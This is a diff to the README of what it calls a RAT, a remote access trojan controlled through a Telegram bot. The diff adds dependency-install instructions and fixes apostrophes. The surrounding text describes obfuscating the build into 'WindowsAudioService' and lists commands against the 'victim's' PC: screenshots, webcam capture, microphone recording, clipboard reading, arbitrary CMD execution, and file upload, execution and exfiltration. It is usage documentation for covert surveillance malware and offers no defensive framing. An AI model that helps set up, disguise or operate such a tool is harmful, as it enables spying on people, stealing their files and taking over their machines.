@@ -16,6 +16,26 @@
 
 ## ⚙️ Installation & Setup
 
+### 0. Install Dependencies
+
+Before running the script, install the required Python packages:
+
+**On Windows:** run `install_deps.bat` (double-click or run from command line).
+
+**On Linux/macOS:** run:
+```bash
+pip install -r requirements.txt
+```
+
+**Manual installation:**
+```bash
+pip install pyTelegramBotAPI Pillow opencv-python sounddevice scipy numpy pygame pyautogui pyperclip
+```
+
+The project includes `requirements.txt` with all necessary dependencies and `install_deps.bat` for automated installation on Windows.
+
+---
+
 ### 1. Create a Telegram bot
 - Message [@BotFather](https://t.me/BotFather) and create a new bot. Get your **token**.
 - Create a private channel (or group) where the bot will send reports.
@@ -65,14 +85,14 @@ Run `obfuscate_fixed.bat` as administrator. The final file `WindowsAudioService.
 
 ## 🎮 Control via Telegram
 
-All commands are sent to your bot’s chat or to the channel (if configured). Each command starts with `/` and usually requires the target hostname (the computer name that the RAT obtains on startup).
+All commands are sent to your bot's chat or to the channel (if configured). Each command starts with `/` and usually requires the target hostname (the computer name that the RAT obtains on startup).
 
 ### Command list
 
 | Command | Description |
 |---------|-------------|
 | `/list` | Shows all online devices |
-| `/screen username` | Takes a screenshot of the victim’s desktop |
+| `/screen username` | Takes a screenshot of the victim's desktop |
 | `/webcam username` | Captures a photo from the webcam (if available) |
 | `/micro username` | Records 10 seconds of audio from the microphone |
 | `/buffer username` | Displays the current clipboard content |
@@ -80,8 +100,8 @@ All commands are sent to your bot’s chat or to the channel (if configured). Ea
 | `/cmd username command` | Executes any CMD command |
 | `/browser username URL` | Opens a link in the default browser |
 | `/wallpaper username` (with attached image) | Changes desktop wallpaper |
-| `/play username` (with attached audio) | Plays audio on the victim’s PC |
-| `/upload username` (with attached file) | Uploads a file to the victim’s PC |
+| `/play username` (with attached audio) | Plays audio on the victim's PC |
+| `/upload username` (with attached file) | Uploads a file to the victim's PC |
 | `/execute username filename` | Runs a previously uploaded file |
 | `/files username` | Lists contents of Desktop, Documents, and Downloads folders |
 | `/export username file_path` | Downloads a file from the victim |
@@ -107,6 +127,8 @@ All commands are sent to your bot’s chat or to the channel (if configured). Ea
 - `main.py` – main agent script.
 - `encrypt.py` – helper script to encrypt token and chat ID.
 - `obfuscate_fixed.bat` – batch file for compilation and obfuscation.
+- `install_deps.bat` – batch file for installing dependencies (Windows).
+- `requirements.txt` – list of Python dependencies.
 - `guide.txt` / `гайд.txt` – usage instructions (English/Russian).
 - `README.txt` / `ПрочитайМеня.txt` – short setup notes.
 
